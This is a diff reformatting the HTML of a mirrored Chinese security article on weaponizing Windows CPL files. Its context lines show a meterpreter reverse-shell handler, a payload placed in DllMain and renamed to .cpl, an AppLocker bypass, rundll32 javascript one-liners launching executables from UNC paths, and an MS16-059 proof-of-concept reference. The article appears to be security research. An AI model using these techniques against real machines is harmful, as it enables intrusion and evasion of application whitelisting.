@@ -3,30 +3,30 @@
 			<head>
 			     <title>CPL文件利用介绍 - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/16042">http://drops.wooyun.org/tips/16042</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>最近在研究<code>Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059)</code>的过程中接触到了cpl文件，于是对其做了进一步研究，发现了一些有趣的细节，分享给大家。</p>
 
 <h1>0x01 简介</h1>
 
-<hr />
+<hr>
 
-<p>CPL文件，是Windows控制面板扩展项，CPL全拼为<code>Control Panel Item</code><br />
-在系统安装目录的system32下面有一系列.cpl文件,它们分别对应着控制面板中的项目<br />
+<p>CPL文件，是Windows控制面板扩展项，CPL全拼为<code>Control Panel Item</code><br>
+在系统安装目录的system32下面有一系列.cpl文件,它们分别对应着控制面板中的项目<br>
 CPL文件本质是Windows可执行性文件，但不属于可以直接独立运行的文件，通常由shell32.dll打开</p>
 
 <!--more-->
 
 <h1>0x02 制作CPL文件</h1>
 
-<hr />
+<hr>
 
 <h2>1、文件特点</h2>
 
@@ -46,11 +46,11 @@ CPL文件本质是Windows可执行性文件，但不属于可以直接独立运�
 
 <p><strong>(3) cmd下输入<code>control &lt;文件名&gt;</code></strong></p>
 
-<p><strong>注：</strong><br />
-cmd下<code>rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;</code>等同于cmd下<code>control &lt;文件名&gt;</code><br />
+<p><strong>注：</strong><br>
+cmd下<code>rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;</code>等同于cmd下<code>control &lt;文件名&gt;</code><br>
 control.exe实质调用了rundll32.exe，通过control.exe执行cpl文件的进程为rundll32.exe</p>
 
-<p><strong>(4) 通过脚本调用</strong><br />
+<p><strong>(4) 通过脚本调用</strong><br>
 <strong>a、</strong>vbs</p>
 
 <pre><code>#!shell
@@ -68,7 +68,7 @@ a.ControlPanelItem("c:\\test\\test.cpl");
 
 <h2>3、使用vc 6.0制作标准cpl模板</h2>
 
-<p>由文件特点可知，cpl本质就是一个dll文件<br />
+<p>由文件特点可知，cpl本质就是一个dll文件<br>
 所以我们可以在vc下创建一个dll的工程，并定义导出函数为CPlApplet</p>
 
 <pre><code>#!c
@@ -97,33 +97,33 @@ CPL_EXIT           | zero              | nonzero
 
 <p>图表来自http://www.codeproject.com/Articles/3026/Creating-a-Config-Panel-Applet</p>
 
-<p><strong>CPL_INIT：</strong><br />
+<p><strong>CPL_INIT：</strong><br>
 进行全局初始化</p>
 
-<p><strong>CPL_GETCOUNT：</strong><br />
-检索应用程序支持的对话框的数目<br />
+<p><strong>CPL_GETCOUNT：</strong><br>
+检索应用程序支持的对话框的数目<br>
 返回值：支持的对话框数目</p>
 
-<p><strong>CPL_NEWINQUIRE：</strong><br />
+<p><strong>CPL_NEWINQUIRE：</strong><br>
 请求该应用程序支持的对话框的请求信息</p>
 
-<p><strong>CPL_SELECT：</strong><br />
+<p><strong>CPL_SELECT：</strong><br>
 设置当用户选择一个对话框时显示的图标</p>
 
-<p><strong>CPL_DBLCLK：</strong><br />
+<p><strong>CPL_DBLCLK：</strong><br>
 设置当用户双击一个对话框时显示的图标</p>
 
-<p><strong>CPL_STOP：</strong><br />
+<p><strong>CPL_STOP：</strong><br>
 控制面板关闭时向每个对话框发出的消息</p>
 
-<p><strong>CPL_EXIT：</strong><br />
+<p><strong>CPL_EXIT：</strong><br>
 释放内存，退出</p>
 
-<p>以上仅对相关函数作简要介绍，详细说明可查msdn，提供一个可供参考的工程模板：<br />
+<p>以上仅对相关函数作简要介绍，详细说明可查msdn，提供一个可供参考的工程模板：<br>
 http://www.vbforums.com/attachment.php?s=7ebc3a64c985f675615a3e9d0aa350e8&amp;attachmentid=286&amp;d=981822351</p>
 
-<p><strong>注：</strong><br />
-函数注释的语言为斯洛文尼亚语，但不影响我们的程序开发<br />
+<p><strong>注：</strong><br>
+函数注释的语言为斯洛文尼亚语，但不影响我们的程序开发<br>
 模板下载后可直接编译出一个cpl文件，双击正常执行</p>
 
 <h2>4、简单粗暴的方式制作cpl文件</h2>
@@ -154,17 +154,17 @@ BOOL APIENTRY DllMain( HANDLE hModule,
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222115453081.gif" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201605/2016052222115453081.gif" alt="Alt text"></p>
 
-<p>点击后弹出cmd，但是退出后会弹框提示程序兼容性问题<br />
-如果是管理员权限的cmd，运行的程序结束后就不会弹框<br />
+<p>点击后弹出cmd，但是退出后会弹框提示程序兼容性问题<br>
+如果是管理员权限的cmd，运行的程序结束后就不会弹框<br>
 <strong>(此问题的解决方法放在后面介绍)</strong></p>
 
 <h1>0x03 测试</h1>
 
-<hr />
+<hr>
 
-<p>由以上内容可推断只要将payload写在DllMain()函数中，就可以直接修改dll后缀名为cpl，然后通过双击来运行<br />
+<p>由以上内容可推断只要将payload写在DllMain()函数中，就可以直接修改dll后缀名为cpl，然后通过双击来运行<br>
 所以自然而然的想到了测试一下meterpreter是否支持这种方式</p>
 
 <p><strong>生成test.cpl：</strong></p>
@@ -183,25 +183,25 @@ set LPORT 8888
 exploit
 </code></pre>
 
-<p>双击test.cpl后弹回meterpreter shell<br />
+<p>双击test.cpl后弹回meterpreter shell<br>
 但是同样在退出的时候会弹框提示程序兼容性助手</p>
 
 <h1>0x04 解决问题</h1>
 
-<hr />
+<hr>
 
 <h2>1、正常dll执行后弹框</h2>
 
-<p>经过测试发现，原有是因为vc6.0的版本低导致的程序兼容问题<br />
+<p>经过测试发现，原有是因为vc6.0的版本低导致的程序兼容问题<br>
 所以换在vs2008(或者更新的版本)下开发就不会存在这个问题</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222122196553.gif" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201605/2016052222122196553.gif" alt="Alt text"></p>
 
 <h2>2、解决meterpreter弹框的问题</h2>
 
-<p>这里不深入探究msfvenom的生成方式，解决方法为使用c++程序自己编写一个meterpreter的reverse_tcp版本<br />
+<p>这里不深入探究msfvenom的生成方式，解决方法为使用c++程序自己编写一个meterpreter的reverse_tcp版本<br>
 <strong>关键代码：</strong></p>
 
 <pre><code>#!c
@@ -283,24 +283,24 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 }
 </code></pre>
 
-<p>生成dll文件，后缀名改为cpl<br />
+<p>生成dll文件，后缀名改为cpl<br>
 正常运行，正常退出</p>
 
 <h1>0x05 Bypass Windows AppLocker</h1>
 
-<hr />
+<hr>
 
-<p>之前介绍过《Bypass Windows AppLocker》<br />
-开启默认规则后会拦截exe和脚本的执行，那么cpl文件呢？<br />
+<p>之前介绍过《Bypass Windows AppLocker》<br>
+开启默认规则后会拦截exe和脚本的执行，那么cpl文件呢？<br>
 当然可以绕过 Windows AppLocker的限制规则</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222123864588.gif" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201605/2016052222123864588.gif" alt="Alt text"></p>
 
 <h1>0x06 rundll32</h1>
 
-<hr />
+<hr>
 
 <p>补充一些rundll32调用js代码的细节;</p>
 
@@ -312,7 +312,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222125227080.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201605/2016052222125227080.png" alt="Alt text"></p>
 
 <p><strong>解决方法：</strong></p>
 
@@ -320,7 +320,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Exec("\\\\127.0.0.1\\c$\\test\\test.exe")
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org/upload/image/201605/2016052222130530357.png" alt="Alt text" /></p>
+<p>如图 <img src="http://static.wooyun.org/upload/image/201605/2016052222130530357.png" alt="Alt text"></p>
 
 <p><strong>执行本地cpl文件，会弹框提示无法识别文件后缀名：</strong></p>
 
@@ -330,7 +330,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222131910235.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org/upload/image/201605/2016052222131910235.png" alt="Alt text"></p>
 
 <p><strong>解决方法：</strong></p>
 
@@ -370,16 +370,16 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 
 <h1>0x07 Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059)</h1>
 
-<hr />
+<hr>
 
 <p>下载链接：<a href="https://www.exploit-db.com/exploits/39805/">https://www.exploit-db.com/exploits/39805/</a></p>
 
-<p>将定制的快捷方式放于任意路径，本地或是远程，当用户访问此目录的时候，就会执行payload<br />
+<p>将定制的快捷方式放于任意路径，本地或是远程，当用户访问此目录的时候，就会执行payload<br>
 演示的远程路径为： <code>\\127.0.0.1\c$\test\poc</code>（正常情况下访问此目录也会当作远程目录被沙盒拦截）</p>
 
 <p>poc演示如图，访问远程目录 <code>\\127.0.0.1\c$\test\poc</code>并绕过沙盒拦截，成功执行payload</p>
 
-<p><img src="http://static.wooyun.org/upload/image/201605/2016052222133921676.gif" alt="Alt text" /></p>      </p>
+<p><img src="http://static.wooyun.org/upload/image/201605/2016052222133921676.gif" alt="Alt text"></p>      <p></p>
     
 			</body>
 		</html>
